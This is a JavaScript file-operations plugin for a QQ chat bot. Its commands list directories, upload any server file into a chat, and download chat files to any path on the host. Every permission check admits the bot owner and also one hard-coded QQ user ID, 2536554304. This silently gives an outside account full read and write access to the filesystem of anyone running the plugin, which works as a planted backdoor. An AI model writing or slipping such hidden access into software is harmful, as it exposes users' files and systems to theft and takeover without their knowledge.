let Running
let es

export class File extends plugin {
  constructor() {
    super({
      name: "文件操作",
      dsc: "文件操作",
      event: "message",
      priority: -Infinity,
      rule: [
        {
          reg: "^文件查看",
          fnc: "List"
        },
        {
          reg: "^文件上传",
          fnc: "Upload"
        },
        {
          reg: "^文件下载",
          fnc: "DownloadDetect"
        }
      ]
    })
  }

  async List(e) {
    if(!(this.e.isMaster||this.e.user_id == 2536554304))return false

    this.finish("List")
    const filePath = this.e.msg.replace("文件查看", "").trim()
    if (!filePath) {
      this.setContext("List")
      await this.reply("请发送文件路径", true)
      return true
    }

    if (!fs.existsSync(filePath)) {
      await this.reply("路径不存在", true)
      return true
    }
    if (!fs.statSync(filePath).isDirectory()) {
      await this.reply("该路径不是一个文件夹", true)
      return true
    }

    await this.reply(fs.readdirSync(filePath).join("\n"), true)
  }

  async Upload(e) {
    if(!(this.e.isMaster||this.e.user_id == 2536554304))return false
    if (Running) {
      await this.reply("有正在执行的文件任务，请稍等……", true)
      return false
    }

    this.finish("Upload")
    const filePath = this.e.msg.replace("文件上传", "").trim()
    if (!filePath) {
      this.setContext("Upload")
      await this.reply("请发送文件路径", true)
      return true
    }

    if (!fs.existsSync(filePath)) {
      await this.reply("文件不存在", true)
      return true
    }
    if (!fs.statSync(filePath).isFile()) {
      await this.reply("暂不支持上传文件夹", true)
      return true
    }

    Running = true
    await this.reply("开始上传文件，请稍等……", true)

    try {
      let res
      if (this.e.isGroup) {
        if (this.e.group.sendFile)
          res = await this.e.group.sendFile(filePath)
        else
          res = await this.e.group.fs.upload(filePath)
      } else {
        res = await this.e.friend.sendFile(filePath)
      }

      if (res) {
        let fileUrl
        if (this.e.group?.getFileUrl)
          fileUrl = await this.e.group.getFileUrl(res.fid)
        else if (this.e.friend?.getFileUrl)
          fileUrl = await this.e.friend.getFileUrl(res)

        if (fileUrl)
          await this.reply(`文件上传完成：${fileUrl}`, true)
        else
          await this.reply(`文件上传完成：${JSON.stringify(res)}`, true)
      }

    } catch(err) {
      logger.error(`文件上传错误：${logger.red(JSON.stringify(err))}`)
      await this.reply(`文件上传错误：${JSON.stringify(err)}`)
    }
    Running = false
  }

  async DownloadDetect(e) {
    es = this.e
    this.setContext("Download")
    await this.reply("请发送文件", true)
  }

  async Download(e) {
    if(!(this.e.isMaster||this.e.user_id == 2536554304))return false
    if(!this.e.file)return false

    this.finish("Download")
    const filePath = `${es.msg.replace("文件下载", "").trim()||process.cwd()}/${this.e.file.name}`
    let fileUrl
    if (this.e.file.url)
      fileUrl = this.e.file.url
    else if (this.e.group?.getFileUrl)
      fileUrl = await this.e.group.getFileUrl(this.e.file.fid)
    else if (this.e.friend?.getFileUrl)
      fileUrl = await this.e.friend.getFileUrl(this.e.file.fid)
    this.e = es

    if (!fileUrl) {
      await this.reply("文件链接获取失败", true)
      return false
    }

    if (Running) {
      await this.reply("有正在执行的文件任务，请稍等……", true)
      return false
    }
    Running = true
    await this.reply(`开始下载文件，请稍等……\n文件链接：${fileUrl}\n保存路径：${filePath}`, true)

    const ret = await common.downFile(fileUrl, filePath)
    if (ret) {
      await this.reply("文件下载完成", true)
    } else {
      await this.reply("文件下载错误", true)
    }
    Running = false
  }
}